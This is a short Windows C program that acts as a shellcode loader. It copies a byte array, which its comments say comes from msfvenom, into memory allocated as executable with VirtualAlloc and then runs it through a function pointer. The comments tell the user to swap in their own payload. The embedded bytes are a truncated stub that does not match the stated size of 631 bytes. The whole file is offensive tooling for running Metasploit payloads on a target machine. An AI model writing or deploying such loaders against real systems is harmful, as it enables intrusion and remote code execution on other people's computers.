#include <stdio.h>
#include <windows.h> //VirtualAlloc is defined here

//YOU MUST REPLACE the spud and the size 

size_t size = 631; //size of spud in bytes (output by msfvenom)

unsigned char spud[] = 
"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff"
"\x63\x64\x61\x25\x6f\x33\xc2\x47\xff\xa3\xa3";







int main(int argc, char **argv) {
char *code;                     //Holds a memory address
code = (char *)VirtualAlloc(    //Allocate a chunk of memory and store the starting address
        NULL, size, MEM_COMMIT,     
        PAGE_EXECUTE_READWRITE  //Set the memory to be writable and executable
    );
memcpy(code, spud, size);    //Copy our spud into the executable section of memory
((void(*)())code)();            //Cast the executable memory to a function pointer and run it 
return(0);
}
